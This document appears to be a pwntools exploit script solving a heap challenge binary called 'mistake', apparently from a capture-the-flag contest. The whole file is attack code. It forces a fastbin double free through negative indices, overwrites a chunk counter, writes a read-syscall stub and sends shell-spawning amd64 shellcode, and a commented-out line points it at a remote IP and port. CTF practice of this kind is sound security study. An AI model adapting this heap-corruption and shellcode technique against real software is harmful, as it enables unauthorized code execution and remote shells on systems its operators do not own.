#coding=utf8
from pwn import *
import struct
context.log_level = 'debug'

def create(data):
    t.recvuntil('> ')
    t.sendline('1')
    t.recvuntil(': ')
    t.sendline(data)

def read(i):
    t.recvuntil('> ')
    t.sendline('2')
    t.recvuntil(': ')
    i = u32(struct.pack('i',i))
    t.sendline(str(i))

def free(i):
    t.recvuntil('> ')
    t.sendline('3')
    t.recvuntil(': ')
    i = u32(struct.pack('i',i))
    t.sendline(str(i))


t = process('./mistake')
#t = remote('115.28.185.220',22222)
for i in range(49):#make 49 [0,48] chunk
    create('123')
free(47)#free 48 [47] chunk
for i in range(0x20):#free head 32 chunk
    free(0)
free(47-0x20)#make double free <fastbin>

free(-5)#0x******78  use align to set chunk_number to zero

create(p64(0x602080-8))#the address we want to make(8+chunk_number(0x21)+00000)
for i in range(0x21):
    create('123')
# now only "one" chunk in fastbin,addr = 0x602080-8,and chunk_number = 0x21
create(struct.pack('i',-18))#set the int behind chunk_number = -18
free(-6)#chunk_number = *(&chun_number +1) = -18 = 
create(asm('push 0x602060;mov rsi,[rsp];mov dl,100;syscall;ret',arch='amd64'))
#length 14
t.recvuntil('> ')
t.sendline("3")
t.recvuntil(': ')

t.send(str(u32(struct.pack("i",-30))))#-30 
t.send(asm(shellcraft.amd64.linux.sh(),arch='amd64'))

t.interactive()
